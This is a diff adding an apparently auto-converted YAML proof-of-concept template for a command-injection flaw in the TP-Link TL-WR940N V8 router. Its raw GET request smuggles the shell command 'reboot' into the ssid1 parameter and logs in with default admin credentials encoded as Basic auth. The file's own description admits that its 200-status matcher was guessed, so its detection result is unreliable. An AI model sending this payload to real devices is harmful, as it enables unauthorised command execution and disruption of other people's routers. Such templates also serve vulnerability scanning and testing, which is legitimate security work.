@@ -1,0 +1,51 @@
+id: poc-xahq0kehvnvhpb95
+info:
+  name: TP-LINKTL-WR940N命令执行漏洞 V8
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xahq0kehvnvhpb95
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xahq0kehvnvhpb95
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /userRpm/WlanNetworkRpm.htm?ssid1=a;reboot&ssid2=TP-LINK_000000_2&ssid3=TP-LINK_000000_3&ssid4=TP-LINK_000000_4&region=101&band=0&mode=3&chanWidth=2&channel=15&rate=71&ap=1&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+
+    Accept-Language: en-US,en;q=0.5
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Authorization: Basic YWRtaW46YWRtaW4=
+
+
+    Cookie: Authorization=
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
